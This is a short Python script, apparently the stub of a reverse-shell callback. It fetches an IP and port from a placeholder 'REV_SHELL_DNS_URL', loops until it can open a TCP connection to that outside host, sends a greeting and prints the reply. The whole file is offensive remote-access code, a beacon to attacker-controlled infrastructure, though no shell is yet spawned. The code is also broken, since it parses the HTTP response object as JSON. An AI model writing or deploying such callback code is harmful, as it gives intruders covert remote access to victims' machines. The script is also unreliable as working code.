import json, requests, subprocess, socket

#wait forever for a connection!
DATA_URL = "REV_SHELL_DNS_URL"
DATA_R = requests.get(DATA_URL)
DATA = json.loads(DATA_R)

while True:
    try:
        DATA_R = requests.get(DATA_URL)
        DATA = json.loads(DATA_R)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((socket.gethostbyname(DATA["ip"]), int(DATA["port"])))
        s.send(b"Hello There!")
        print(s.recv(1024))
        s.close()
        break
    except: pass
print("Exiting!")